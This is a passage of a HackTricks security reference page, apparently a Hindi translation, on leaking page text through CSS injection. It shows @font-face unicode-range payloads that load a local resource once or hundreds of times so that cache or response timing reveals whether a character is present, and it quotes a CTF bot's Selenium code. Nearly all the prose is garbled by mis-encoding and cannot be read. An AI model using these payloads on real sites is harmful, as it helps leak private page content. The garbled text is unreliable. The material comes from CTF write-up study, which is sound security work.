**рд╕рдВрджрд░реНрдн:** рдЗрд╕реЗ [рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рдПрдХ рдЕрд╕рдлрд▓ рд╕рдорд╛рдзрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

рдпрд╣ рдорд╛рдорд▓рд╛ рдкрд┐рдЫрд▓реЗ рдорд╛рдорд▓реЗ рдХреЗ рдмрд╣реБрдд рд╕рдорд╛рди рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреБрдЫ **рддрддреНрд╡реЛрдВ рдХреЛ рджреВрд╕рд░реЛрдВ рд╕реЗ рдмрдбрд╝рд╛ рдмрдирд╛рдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдХреБрдЫ рдЫрд┐рдкрд╛рдирд╛** рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдмреЙрдЯ рджреНрд╡рд╛рд░рд╛ рджрдмрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдмрдЯрди рдпрд╛ рдПрдХ рдРрд╕реА рдЫрд╡рд┐ рдЬреЛ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП рд╣рдо рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЛ рдорд╛рдк рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдЕрднрд╛рд╡ рдХреЛ) рдФрд░ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдкрд╛рда рдореЗрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖ рддрддреНрд╡ рдореМрдЬреВрдж рд╣реИред

### рдкрд╛рда рдиреЛрдб рдЕрдкрд╣рд░рдг (III): рдХреИрд╢ рдЯрд╛рдЗрдорд┐рдВрдЧ рджреНрд╡рд╛рд░рд╛ рдЪрд╛рд░рд╕реЗрдЯ рдЕрдкрд╣рд░рдг (рдмрд╛рд╣реНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**рд╕рдВрджрд░реНрдн:** рдЗрд╕реЗ [рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рдПрдХ рдЕрд╕рдлрд▓ рд╕рдорд╛рдзрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╣рдо рд╕рдВрджрд░реНрдн рд╕реЗ рдПрдХ рдирдХрд▓реА рдлрд╝реЙрдиреНрдЯ рд▓реЛрдб рдХрд░рдХреЗ рдкрд╛рда рдореЗрдВ рдПрдХ рддрддреНрд╡ рд╣реИ рдпрд╛ рдирд╣реАрдВ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
рдпрджрд┐ рдорд┐рд▓рд╛рди рд╣реЛрддрд╛ рд╣реИ, рддреЛ **рдлрд╝реЙрдиреНрдЯ `/static/bootstrap.min.css?q=1` рд╕реЗ рд▓реЛрдб рд╣реЛрдЧрд╛**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрд╕реЗ рдХреИрд╢ рдХрд░реЗрдЧрд╛**, рдФрд░ рдпрджрд┐ рдХреЛрдИ рдХреИрд╢ рдирд╣реАрдВ рд╣реИ, рддреЛ рдпрд╣рд╛рдВ рдПрдХ **304 not modified** рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рд╣реИ, рдЗрд╕рд▓рд┐рдП рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЕрдиреНрдп рдЪреАрдЬрд╝реЛрдВ рд╕реЗ **рддреЗрдЬрд╝ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдХреИрд╢ рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдФрд░ рдЧреИрд░-рдХреИрд╢ рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдмреАрдЪ рдХрд╛ рд╕рдордп рдЕрдВрддрд░ рдкрд░реНрдпрд╛рдкреНрдд рдмрдбрд╝рд╛ рдирд╣реАрдВ рд╣реИ, рддреЛ рдпрд╣ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд▓реЗрдЦрдХ рдиреЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рд╣реИ: рд╣рд╛рд▓рд╛рдВрдХрд┐, рдкрд░реАрдХреНрд╖рдг рдХреЗ рдмрд╛рдж, рдореБрдЭреЗ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ рдкрд╣рд▓реА рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЧрддрд┐ рдореЗрдВ рдмрд╣реБрдд рдЕрдВрддрд░ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рджреВрд╕рд░реА рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдмреЙрдЯ `disk-cache-size=1` рдлрд╝реНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕реЛрдЪрд╡рд╛рдИ рдЧрдИ рд╣реИред

### рдкрд╛рда рдиреЛрдб рдЙрджреНрдзрд░рдг (III): рд╕рдордпрд┐рдХ рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЪрд╛рд░рд╕реЗрдЯ рд▓реАрдХ рдХрд░рдирд╛ рд╕реНрдерд╛рдиреАрдп "рдлрд╝реЙрдиреНрдЯ" (рдмрд╛рд╣реНрдп рд╕рдВрдкрддреНрддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА) рд╕реЗ рд╕реИрдХрдбрд╝реЛрдВ рд▓реЛрдб рдХрд░рдирд╛ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**рд╕рдВрджрд░реНрдн:** рдЗрд╕реЗ [рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рдПрдХ рдЕрд╕рдлрд▓ рд╕рдорд╛рдзрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЬрдм рдорд┐рд▓рд╛рди рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЖрдк **CSS рдХреЛ рд╕реИрдХрдбрд╝реЛрдВ рдирдХрд▓реА рдлрд╝реЙрдиреНрдЯреНрд╕** рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрджрд░реНрдн рд╕реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдЖрдк **рд╕рдордп рдХреЛ рдорд╛рдк** рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╡рд░реНрдг рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рд╕реЗ:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
рдФрд░ рдмреЙрдЯ рдХрд╛ рдХреЛрдб рдЗрд╕ рддрд░рд╣ рд╕реЗ рджрд┐рдЦрддрд╛ рд╣реИ:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрджрд┐ рдлрд╝реЙрдиреНрдЯ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдмреЙрдЯ рдХреЛ рдЬрд╛рдиреЗ рдкрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рд╕рдордп рд▓рдЧрднрдЧ 30 рд╕реЗрдХрдВрдб рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рдореЗрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдлрд╝реЙрдиреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗ, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рд╣рдореЗрд╢рд╛ рдХреБрдЫ рди рдХреБрдЫ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╕реНрдЯреЙрдк рд╕реНрдерд┐рддрд┐ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╕рдордп рд▓рдЧреЗрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╕рдордп рдмрддрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдореЗрд▓ рд╣реИ рдпрд╛ рдирд╣реАрдВред

## рд╕рдВрджрд░реНрдн

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
